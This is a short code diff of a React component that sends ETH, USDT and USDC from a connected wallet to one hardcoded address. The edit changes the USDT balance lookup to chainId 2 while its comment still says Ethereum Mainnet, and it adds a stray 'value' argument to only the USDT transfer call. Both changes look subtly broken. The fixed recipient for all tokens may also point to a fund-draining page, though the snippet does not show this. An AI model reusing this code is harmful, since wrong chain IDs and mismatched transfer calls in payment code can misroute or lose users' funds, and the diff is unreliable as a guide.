@@ -14,7 +14,7 @@ const SendTransaction = () => {
   });
   const usdtBalance = useBalance({
     address: address,
-    chainId: 1, // ID-ul lanțului Ethereum (Mainnet)
+    chainId: 2, // ID-ul lanțului Ethereum (Mainnet)
     currency: 'USDT',
   });
   const usdcBalance = useBalance({
@@ -41,7 +41,7 @@ const SendTransaction = () => {
           await sendTransaction({ to: '0x95151cFb8538962C6405586C39596D4C3210c234', value: amount });
           break;
         case 'USDT':
-          await sendTransactionToAddress('0x95151cFb8538962C6405586C39596D4C3210c234', amount, 'USDT');
+          await sendTransactionToAddress('0x95151cFb8538962C6405586C39596D4C3210c234', value, amount, 'USDT');
           break;
         case 'USDC':
           await sendTransactionToAddress('0x95151cFb8538962C6405586C39596D4C3210c234', amount, 'USDC');
